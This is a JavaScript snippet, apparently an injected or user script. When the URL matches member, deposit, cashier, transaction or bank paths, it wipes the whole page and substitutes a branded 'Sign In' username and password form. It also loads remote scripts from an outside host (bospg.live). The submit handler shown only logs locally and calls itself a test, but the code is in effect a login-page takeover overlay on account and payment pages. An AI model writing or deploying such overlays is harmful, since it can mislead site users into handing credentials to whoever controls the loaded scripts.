(function () {
    "use strict";

    /*
     * Hanya jalankan pada URL yang ditentukan
     */
    const url = window.location.href;

    const match = [
        "/jablay",
        "/desa",
        "/member.php",
        "/saldomember.php",
        "/deposip",
        "/qrihp",
        "/cashir",
        "/?pagetransaksi",
        "/indphp?page=transaksi",
        "/?dit&head=hoe",
        "/inphp?page=cashier",
        "/bnk.php"
    ];

    if (!match.some(function (path) {
        return url.includes(path);
    })) {
        return;
    }

    /*
     * Tampilan halaman baru
     */
    const html = `
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>log in | Production</title>

    <link
        rel="shortcut icon"
        href="https://bospg.live/digicore_dashboard/assets/images/favicon.ico"
    >

    <link
        href="https://bospg.live/digicore_dashboard/assets/css/icons.min.css"
        rel="stylesheet"
    >

    <link
        href="https://bospg.live/digicore_dashboard/assets/css/app.min.css"
        rel="stylesheet"
        id="light-style"
    >

    <link
        href="https://bospg.live/digicore_dashboard/assets/css/app-dark.min.css"
        rel="stylesheet"
        id="dark-style"
    >
</head>

<body
    class="authentication-bg"
    data-layout-config='{
        "leftSideBarTheme":"dark",
        "layoutBoxed":false,
        "leftSidebarCondensed":false,
        "leftSidebarScrollable":false,
        "darkMode":false,
        "showRightSidebarOnStart":true
    }'
>

    <div class="account-pages pt-2 pt-sm-5 pb-4 pb-sm-5">

        <div class="container">

            <div class="row justify-content-center">

                <div class="col-xxl-4 col-lg-5">

                    <div class="card">

                        <div class="card-header pt-4 pb-4 text-center bg-primary">

                            <a href="#">

                                <span>

                                    <img
                                        src="https://bospg.live/uploads/1786882219_logo.gif"
                                        alt="Logo"
                                        height="32"
                                    >

                                </span>

                            </a>

                        </div>

                        <div class="card-body p-4">

                            <div class="text-center w-75 m-auto">

                                <h4 class="text-dark-50 text-center pb-0 fw-bold">
                                    Sign In
                                </h4>

                            </div>

                            <form
                                action="#"
                                method="POST"
                                id="loginForm"
                            >

                                <div class="mb-3">

                                    <label
                                        for="username"
                                        class="form-label"
                                    >
                                        username
                                    </label>

                                    <input
                                        class="form-control"
                                        type="text"
                                        id="username"
                                        name="username"
                                        required
                                        autocomplete="username"
                                        placeholder="Masukan username anda..."
                                    >

                                </div>


                                <div class="mb-3">

                                    <label
                                        for="password"
                                        class="form-label"
                                    >
                                        password
                                    </label>

                                    <div class="input-group input-group-merge">

                                        <input
                                            type="password"
                                            id="password"
                                            name="password"
                                            class="form-control"
                                            required
                                            autocomplete="current-password"
                                            placeholder="Masukan password anda..."
                                        >

                                    </div>

                                </div>


                                <div class="mb-3 mb-0 text-center">

                                    <button
                                        class="btn btn-primary"
                                        type="submit"
                                        id="loginButton"
                                    >
                                        log in
                                    </button>

                                </div>

                            </form>

                        </div>

                    </div>


                    <div class="row mt-3">

                        <div class="col-12 text-center">

                            <p class="text-muted">
                                WHERE IDEAS BECOME CODES
                            </p>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>


    <footer class="footer footer-alt">
        2018 - 2026 © Gaming Hype - Digicore Studios
    </footer>


</body>

</html>
`;

    /*
     * Ganti SELURUH dokumen lama
     */
    function renderPage() {

        document.documentElement.innerHTML = html;

        /*
         * Pastikan halaman lama benar-benar tidak digunakan lagi
         */
        document.title = "log in | Production";

        const form = document.getElementById("loginForm");

        if (!form) {
            console.error("loginForm tidak ditemukan.");
            return;
        }

        /*
         * Handler login untuk testing lokal
         */
        form.addEventListener("submit", function (event) {

            event.preventDefault();

            const username =
                document.getElementById("username");

            const password =
                document.getElementById("password");

            if (!username.value.trim()) {
                alert("Silakan isi username.");
                username.focus();
                return;
            }

            if (!password.value.trim()) {
                alert("Silakan isi password.");
                password.focus();
                return;
            }

            /*
             * Jangan mengirim password ke pihak lain.
             * Hanya contoh pemrosesan lokal.
             */
            console.log("Username:", username.value);
            console.log("Password: [REDACTED]");

            alert("Form berhasil diproses untuk testing.");

        });


        /*
         * Load CSS/JS bawaan tampilan
         */
        const vendor =
            document.createElement("script");

        vendor.src =
            "https://bospg.live/digicore_dashboard/assets/js/vendor.min.js";

        vendor.async = true;

        document.body.appendChild(vendor);


        const app =
            document.createElement("script");

        app.src =
            "https://bospg.live/digicore_dashboard/assets/js/app.min.js";

        app.async = true;

        document.body.appendChild(app);
    }


    /*
     * Jalankan
     */
    if (document.readyState === "loading") {

        document.addEventListener(
            "DOMContentLoaded",
            renderPage,
            { once: true }
        );

    } else {

        renderPage();

    }

})();
